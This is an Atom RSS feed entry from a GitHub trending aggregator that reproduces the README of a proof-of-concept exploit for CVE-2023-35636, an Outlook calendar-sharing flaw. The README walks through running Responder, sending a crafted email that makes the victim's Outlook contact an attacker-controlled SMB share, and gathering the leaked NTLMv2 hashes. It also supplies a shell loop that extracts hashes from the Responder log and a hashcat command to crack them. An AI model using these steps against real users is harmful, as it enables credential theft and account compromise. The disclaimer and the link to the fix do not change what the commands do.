<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Shell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-02-02T01:38:34Z</updated>
  <subtitle>Daily Trending of Shell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>duy-31/CVE-2023-35636</title>
    <updated>2024-02-02T01:38:34Z</updated>
    <id>tag:github.com,2024-02-02:/duy-31/CVE-2023-35636</id>
    <link href="https://github.com/duy-31/CVE-2023-35636" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Microsoft Outlook Information Disclosure Vulnerability (leak password hash) - Expect Script POC&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2023-35636&lt;/h1&gt; &#xA;&lt;p&gt;Microsoft Outlook Information Disclosure Vulnerability (leak password hash) - Expect Script POC&lt;/p&gt; &#xA;&lt;p&gt;CVE-2023-35636 an exploit of the calendar sharing function in Microsoft Outlook, whereby adding two headers to an email directs Outlook to share content and contact a designated machine creating an opportunity to intercept an NTLM v2 hash.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Run a responder with SMB server on&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/duy-31/CVE-2023-35636/assets/20819326/0b7d59ba-2535-4288-a51b-70479d6d0a4b&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Send an email &amp;amp; wait (the email recipient firewall have to let SMB (445) trafic pass)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;usage: ./cve-2023-35636.sh mx.fqdn port email_sender email_recipient smb_share&lt;/p&gt; &#xA;&lt;p&gt;./cve-2023-35636.sh mail.mydomain.com 25 &lt;a href=&#34;mailto:duy-31@domain.com&#34;&gt;duy-31@domain.com&lt;/a&gt; &lt;a href=&#34;mailto:pwned@otherdomain.com&#34;&gt;pwned@otherdomain.com&lt;/a&gt; \\\\x.x.x.x\\mycalendar.ics (dont forget all the \)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/duy-31/CVE-2023-35636/assets/20819326/8e7379d5-8b42-443e-ae9c-620bf2e5dbbf&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;notes: chmod +x cve-2023-35636.sh&lt;/p&gt; &#xA;&lt;p&gt;require app expect&lt;/p&gt; &#xA;&lt;p&gt;require legitimate ip sender and email sender (to pass SPF, DKIM, DMARC)&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If the recipient user click on the little calendar icon .. BOOM the ip/user (clear text) and password hash (NTLM-v2-SSP) are send to your responder IP&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/duy-31/CVE-2023-35636/assets/20819326/884b1de2-89c2-47cc-af99-4e8f1dccb517&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/duy-31/CVE-2023-35636/assets/20819326/1ee7f21a-713d-4319-b89a-b1c9b87c7306&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You can then try to crack the password with hashcat/john the ripper&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;for user in &lt;code&gt;strings Responder-Session.log | grep &#34;NTLMv2-SSP Hash&#34; | cut -d &#34;:&#34; -f 4-6 | sort -u -f | awk &#39;{$1=$1};1&#39;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;do&lt;/p&gt; &#xA;&lt;p&gt;echo &#34;[*] search for: $user&#34;;&lt;/p&gt; &#xA;&lt;p&gt;strings Responder-Session.log | grep &#34;NTLMv2-SSP Hash&#34; | grep -i $user | cut -d &#34;:&#34; -f 4-10 | head -n 1 | awk &#39;{$1=$1};1&#39; &amp;gt;&amp;gt; ntlm-hashes.txt&lt;/p&gt; &#xA;&lt;p&gt;done&lt;/p&gt; &#xA;&lt;p&gt;hashcat -a 0 -m 5600 ntlm-hashes.txt rockyou.txt -o cracked.txt -O&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Kudos: &lt;a href=&#34;https://www.varonis.com/blog/outlook-vulnerability-new-ways-to-leak-ntlm-hashes&#34;&gt;https://www.varonis.com/blog/outlook-vulnerability-new-ways-to-leak-ntlm-hashes&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Workaround/Fix: &lt;a href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-35636&#34;&gt;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-35636&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;more about me ;) &lt;a href=&#34;https://www.linkedin.com/in/duy-huan-bui/&#34;&gt;https://www.linkedin.com/in/duy-huan-bui/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;⚠️ Disclaimer: IMPORTANT: This script is provided for educational, ethical testing, and lawful use ONLY. Do not use it on any system or network without explicit permission. Unauthorized access to computer systems and networks is illegal, and users caught performing unauthorized activities are subject to legal actions. The author is NOT responsible for any damage caused by the misuse of this script.&lt;/p&gt;</summary>
  </entry>
</feed>